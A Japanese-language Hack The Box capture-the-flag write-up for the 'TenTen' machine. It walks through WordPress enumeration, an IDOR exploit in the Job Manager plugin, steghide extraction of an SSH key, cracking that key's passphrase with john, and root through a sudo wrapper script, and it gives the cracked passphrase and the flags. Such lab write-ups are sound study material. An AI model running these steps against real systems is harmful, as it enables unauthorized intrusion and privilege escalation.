

![HTB Banner](https://github.com/hackthebox/writeup-templates/blob/master/machine/assets/images/banner.png?raw=true)


- URL : 
- #medium 
- OS : #Linux 
- Machine Author(s): [ch4p](https://app.hackthebox.com/users/1)
- Hack Date: 2024-12-26,17:06


# Enumeration
22番と80番のポートが空いてる。
webサーバーは、 Apache/2.4.18 (Ubuntu)
```bash
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ec:f7:9d:38:0c:47:6f:f0:13:0f:b9:3b:d4:d6:e3:11 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQD0ZxDYLkSx3+n8qOc+tpjAd+KZ8STcHdayXH5Vn7gRhiI6toUP53yvS4ysmU4uq/QkX+oAJabm3H2WdVDySKvLVitCstPErNjKmi3Zr4ROlJVyv25eR0Wuo42PqDRCB0DN5SBZsoylDM1FN53ZTdiTC4Da4NM/3zfXzJgBpo8NdRyCZJnTufOdR8x4RE/0QU6UZR1cJPKKNmS/7qzHtMDZx5MM0li07d77mDpUoMCxPGCWlH5VsgpKBUSvdzd5xjilN5/tU/uwgL4FLTcMJF6DPDORYxJWjGO8ThSm8nf+kgxdv1iSF3olv++tReoWjVZy/xrEIdgHTcPjGggldR9v
|   256 cc:fe:2d:e2:7f:ef:4d:41:ae:39:0e:91:ed:7e:9d:e7 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBERpTI9NMPamS6NaoLL5Y/nq+T19q1KR6GgtbsnmjCTtnGBKlaGI46uCPIYZwQ0MFDRg1hxq13rhLxl7JPIEjWU=
|   256 8d:b5:83:18:c0:7c:5d:3d:38:df:4b:e1:a4:82:8a:07 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIOrtl+D1cRlO2WrvblMacn5J5/rh+PTJmgxDwkBBfg7
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.18
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://tenten.htb/
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

whatwebで調査
CMSはWordPress 4.7.3、JS、JQuery 1.12.4が動いてる
```bash
└──╼ [★]$ sudo whatweb http://tenten.htb/
http://tenten.htb/ [200 OK] Apache[2.4.18], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.129.252.62], JQuery[1.12.4], MetaGenerator[WordPress 4.7.3], PoweredBy[WordPress,WordPress,], Script[text/javascript], Title[Job Portal &#8211; Just another WordPress site], UncommonHeaders[link], WordPress[4.7.3]
```

### WordPressを使ってるので、WPScanで調査する
CSRF(Cross-Site Request Forgeries)とXSSの違い

| **特徴**      | **CSRF**                                 | **XSS**                                  |
| ----------- | ---------------------------------------- | ---------------------------------------- |
| **共通点**     | - ユーザーが被害を受ける  <br>- サーバーまたはクライアントが悪用される | - ユーザーが被害を受ける  <br>- サーバーまたはクライアントが悪用される |
| **ユーザーの関与** | 認証済みユーザーのセッションが必要                        | ページを閲覧するだけで被害を受ける場合が多い                   |
| **影響範囲**    | サーバー側で意図しない操作が発生                         | クライアント（ブラウザ）側でスクリプトが実行される                |
| **攻撃の発生条件** | - 被害者がログイン中であること  <br>- 攻撃者が悪意あるリクエストを送る | - 攻撃者がスクリプトを注入  <br>- 被害者がページにアクセス       |

とりあえず、WPScanで出た脆弱性が試せるかを確認する。
以下の興味深そうな脆弱性を片っ端から、Tentenで実行できるのかを一つずつ試していく。
選んだ条件としては、XSS,CSRFではないことくらいかな
- Host Header Injection in Password Reset
	- CVE-2017-8295
		- リモートの攻撃者により、巧妙に細工された wp-login.php？action=lostpassword リクエストを介して、攻撃者が管理するSMTP サーバ上のメールボックスにリセットキーを送信する可能性があります。
		- https://www.exploit-db.com/exploits/41963
		- いくつか、PoCをコードにしたものが見つかったが、そもそもこの脆弱性をwordpressが抱えているかをチェックするコードがあったので、これを使ってチェックする
			- https://gist.github.com/stevegrunwell/4a8f1990972b3570b3e423533b318aac
			-  ~~この脆弱性はtentenにはありませんって言ってるけど、ほんとなのか？~~
				- 本当でした。GUIで同じようなことしたら、email()関数？がないからメールを送れないとのこと。
				- ![](https://raw.githubusercontent.com/crum7/Obsidian/main/HackTheBox_Writeups/Retired/Medium/TenTen/images/Pasted%20image%2020241226224948.png)
		- PoC?
			- https://github.com/cyberheartmi9/CVE-2017-8295
			- 認証されていない攻撃者により、'wp_lang' パラメータを介して、任意の翻訳ファイルにアクセスして読み込まれる可能性があります。
- CVE-2023-2745
	- WordPress Core におけるディレクトリトラバーサルの脆弱性
	- WordPress Core は、バージョン 6.2 まで、'wp_lang' パラメータを介してディレクトリ トラバーサルに対して脆弱です。これにより、認証されていない攻撃者が任意の翻訳ファイルにアクセスして読み込むことができます。攻撃者がアップロード フォームなどを介して細工した翻訳ファイルをサイトにアップロードできる場合、これはクロスサイト スクリプティング攻撃にも使用される可能性があります。
	- でも、アップロードできないんよね。アカウントないし作れないから。
 ```text
| [!] Title: WordPress 2.3-4.8.3 - Host Header Injection in Password Reset
|     References:
|      - https://wpscan.com/vulnerability/b3f2f3db-75e4-4d48-ae5e-d4ff172bc093
|      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-8295
|      - https://exploitbox.io/vuln/WordPress-Exploit-4-7-Unauth-Password-Reset-0day-CVE-2017-8295.html
|      - https://blog.dewhurstsecurity.com/2017/05/04/exploitbox-wordpress-security-advisories.html
|      - https://core.trac.wordpress.org/ticket/25239

| [!] Title: WP < 6.0.3 - SQLi in WP_Date_Query
|     Fixed in: 4.7.25
|     References:
|      - https://wpscan.com/vulnerability/1da03338-557f-4cb6-9a65-3379df4cce47
|      - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/
|      - https://github.com/WordPress/wordpress-develop/commit/d815d2e8b2a7c2be6694b49276ba3eee5166c21f





| [!] Title: WordPress <= 5.2.3 - Admin Referrer Validation
|     Fixed in: 4.7.15
|     References:
|      - https://wpscan.com/vulnerability/715c00e3-5302-44ad-b914-131c162c3f71
|      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-17675
|      - https://wordpress.org/news/2019/10/wordpress-5-2-4-security-release/
|      - https://github.com/WordPress/WordPress/commit/b183fd1cca0b44a92f0264823dd9f22d2fd8b8d0
|      - https://blog.wpscan.com/wordpress/security/release/2019/10/15/wordpress-524-security-release-breakdown.html



| [!] Title: WordPress < 5.8.3 - Super Admin Object Injection in Multisites
|     Fixed in: 4.7.22
|     References:
|      - https://wpscan.com/vulnerability/008c21ab-3d7e-4d97-b6c3-db9d83f390a7
|      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-21663
|      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-jmmq-m8p8-332h
|      - https://hackerone.com/reports/541469

| [!] Title: WP < 6.0.3 - Email Address Disclosure via wp-mail.php
|     Fixed in: 4.7.25
|     References:
|      - https://wpscan.com/vulnerability/c5675b59-4b1d-4f64-9876-068e05145431
|      - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/
|      - https://github.com/WordPress/wordpress-develop/commit/5fcdee1b4d72f1150b7b762ef5fb39ab288c8d44

| [!] Title: WP < 6.2.1 - Directory Traversal via Translation Files
|     Fixed in: 4.7.26
|     References:
|      - https://wpscan.com/vulnerability/2999613a-b8c8-4ec0-9164-5dfe63adf6e6
|      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-2745
|      - https://wordpress.org/news/2023/05/wordpress-6-2-1-maintenance-security-release/


```

CVE-2015-6668
- IDOR(Insecure Direct Object Reference)
	- 例 : `GET /user/profile?id=123`こういうので、idの番号変えたら、他の人のやつ見れる脆弱性
		- PoC
			- https://github.com/jimdiroffii/CVE-2015-6668
			- でも、user.txtとか入れても出てこないよなあと思って、お手上げして、GuidedMode見て、あれと思って以下のリンクのサンプルに書いてあるEnter a file name: HackerAccessGrantedを入れたら、なんか画像が出てきて草
			- こんなの実際の環境でどう役に立つねん！笑
			- まあ、HTBはCTFなのでね、しゃあない。
			

```bash
[+] job-manager
 | Location: http://tenten.htb/wp-content/plugins/job-manager/
 | Latest Version: 0.7.25 (up to date)
 | Last Updated: 2015-08-25T22:44:00.000Z
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | [!] 2 vulnerabilities identified:
 |
 | [!] Title: Job Manager <= 0.7.25 -  Insecure Direct Object Reference (IDOR)
 |     References:
 |      - https://wpscan.com/vulnerability/9fd14f37-8c45-46f9-bcb6-8613d754dd1c
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-6668
 |      - https://vagmour.eu/cve-2015-6668-cv-filename-disclosure-on-job-manager-wordpress-plugin/
 |
 | [!] Title: Job Manager <= 0.7.25 - Admin+ Stored Cross-Site Scripting
 |     References:
 |      - https://wpscan.com/vulnerability/e649292a-81d2-40c4-a075-ac98a3578fe8
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-39336
 |      - https://www.wordfence.com/vulnerability-advisories/#CVE-2021-39336
 |
 | Version: 7.2.5 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://tenten.htb/wp-content/plugins/job-manager/readme.txt

```

### ディレクトリスキャン
お馴染みのディレクトリスキャンと、ffufでサブドメインを洗い出す
- ディレクトリスキャンの/.sudo_as_admin_successfulという怪しい隠しファイルの中に`Cookie: wordpress_test_cookie=WP+Cookie+check`というのが入ってるけど、デフォルトっぽい？
	https://www.walbrix.co.jp/article/wordpress-test-cookie-httponly.html
	- ![](https://raw.githubusercontent.com/crum7/Obsidian/main/HackTheBox_Writeups/Retired/Medium/TenTen/images/Pasted%20image%2020241226232231.png)
```bash
└──╼ [★]$ dirsearch -u tenten.htb -t 50 -i 200

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 50 | Wordlist size: 11460

Output File: /home/snowyowl644/reports/_tenten.htb/_24-12-26_02-26-04.txt

Target: http://tenten.htb/

[02:26:11] Starting: 
[02:26:11] 200 -  220B  - /.bash_logout
[02:26:12] 200 -    4KB - /.bashrc
[02:26:13] 200 -  655B  - /.profile
[02:26:14] 200 -    0B  - /.sudo_as_admin_successful
[02:26:29] 200 -    7KB - /license.txt
[02:26:36] 200 -    3KB - /readme.html
[02:26:43] 200 -    1B  - /wp-admin/admin-ajax.php
[02:26:43] 200 -    0B  - /wp-config.php
[02:26:43] 200 -    0B  - /wp-content/
[02:26:43] 200 -  530B  - /wp-admin/install.php
[02:26:43] 200 -   84B  - /wp-content/plugins/akismet/akismet.php
[02:26:43] 200 -    0B  - /wp-cron.php
[02:26:44] 200 -    1KB - /wp-login.php

Task Completed

```

- **Tactics**:
    - #Tactic_情報収集
    - #Tactic_探索
- **Techniques**:
    - #T1016_システムネットワーク構成の探索
    - #T1046_ネットワークサービススキャン
    - #T1057_プロセス探索`
    - #T1018_リモートシステム探索`
    - その他のDiscovery関連技術...




# Foothold
WordPressのJobManagerというプラグインにCVE-2015-6688という脆弱性が見つかった
- WordPress アップロード ディレクトリ構造へのブルート フォース攻撃によってリモートの攻撃者が任意の CV ファイルを読み取る可能性がある。
	- CVファイル
		- なんのことか調べてもわからなかった
	- PoC
		- https://github.com/jimdiroffii/CVE-2015-6668
PoCを利用してアップロードディレクトリへのブルートフォースを行ったら、以下の画像が見つかった
```bash
└──╼ [★]$ python3 exploit.py

CVE-2015-6668
Title: CV filename disclosure on Job-Manager WP Plugin
Author: Evangelos Mourikis
Blog: https://vagmour.eu
Plugin URL: http://www.wp-jobmanager.com
Versions: <=0.7.25

Enter a vulnerable website: http://tenten.htb
Enter a file name: HackerAccessGranted
[+] URL of CV found! http://tenten.htb/wp-content/uploads/2017/04/HackerAccessGranted.jpg

```
![](https://raw.githubusercontent.com/crum7/Obsidian/main/HackTheBox_Writeups/Retired/Medium/TenTen/images/Pasted%20image%2020241227111917.png)

ステガノグラフィーかもしれないので、どのような情報が含まれているのかをみる。
秘密鍵が含まれているらしい。
```bash
└──╼ [★]$ sudo steghide info *.jpg
"HackerAccessGranted.jpg":
  format: jpeg
  capacity: 15.2 KB
Try to get information about embedded data ? (y/n) y
Enter passphrase: 
  embedded file "id_rsa":
    size: 1.7 KB
    encrypted: rijndael-128, cbc
    compressed: yes

```

抽出する。
パスワードは特にないので、Enter押すだけで大丈夫
```bash
└──╼ [★]$ sudo steghide extract -sf *.jpg
Enter passphrase: 
wrote extracted data to "id_rsa".
```

出力された`id_rsa`がどのようなRSA鍵であるかを解析するために、`john`を用いて複合する。複合を行うには、まず現在の`id_rsa`ファイルを`.john`形式に変換する必要がある。
そのため、以下のコードで、rsaを.johnに変えるためのスクリプトを検索する。出力された`/usr/share/john/ssh2john.py`を利用する。このスクリプトを使うことで、取得したRSA暗号を`john`で解析可能な`.john`形式に変換できる。
```bash
sudo find / -iname *2john* -type f 2>/dev/null
```

johnで解析したら、パスワードが「superpassword」であることがわかった。
```bash
└──╼ [★]$ sudo john --wordlist=/usr/share/wordlists/rockyou.txt rsa.john
Created directory: /root/.john
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Press Ctrl-C to abort, or send SIGUSR1 to john process for status
superpassword    (id_rsa)     
1g 0:00:00:00 DONE (2024-12-26 10:03) 1.724g/s 1344Kp/s 1344Kc/s 1344KC/s superram..supermoy
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

```

tenten.htbのwordpressにアカウントがあるtakisでsshにログインする
SSH接続で使用する秘密鍵を指定して、ログインをする必要がある。
この時、パスワードを求められるが、パスワードは、superpasswordである。
これで、ユーザー権限は取得できた。
```bash
ssh -i id_rsa takis@10.129.247.176
```

- **Tactics**:
    - #Tactic_初期アクセス
    - #Tactic_Escution_実行
- **Techniques**:
    - #T1190_公開アプリケーションのエクスプロイト
    - #T1059_コマンドとスクリプトインタープリタ
    - #T1078_有効なアカウント
    - その他のInitial Access/Execution関連技術...





# Privilege Escalation

sudo -lで
```bash
takis@tenten:~$ sudo -l
Matching Defaults entries for takis on tenten:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User takis may run the following commands on tenten:
    (ALL : ALL) ALL
    (ALL) NOPASSWD: /bin/fuckin

```

```bash
takis@tenten:~$ file /bin/fuckin
/bin/fuckin: Bourne-Again shell script, ASCII text executable
takis@tenten:~$ cat /bin/fuckin
#!/bin/bash
$1 $2 $3 $4
```

```bash
takis@tenten:~$ sudo /bin/fuckin sudo /bin/bash   
root@tenten:~# ls
```


- **Tactics**:
    - #Tactic_特権昇格
- **Techniques**:
    - #T1068_特権昇格のためのエクスプロイト
    - #T1055_プロセス注入
    - #T1053_スケジュールされたタスク/ジョブ
    - その他のPrivilege Escalation関連技術...




## Notes

- **Tactics**:
    - #Tactic_永続化
    - #Tactic_防御回避
- **Techniques**:
    - #T1098_アカウント操作
    - #T1553_信頼制御の転覆
    - #T1070_ホスト上の痕跡削除
    - その他のPersistence/Defense Evasion関連技術...



## Flags

- **User**: 0bf01acf49bac4e88cbf781c299f900f
- **Root**: eb428d5fa003b32e5b2beb1798d92ea1

### ポイント


- WordPressのプラグインはOSSなので、脆弱性あることが多い
- 脆弱性を使った調査で画像出てきたら、ステガノグラフィの可能性あり。
- 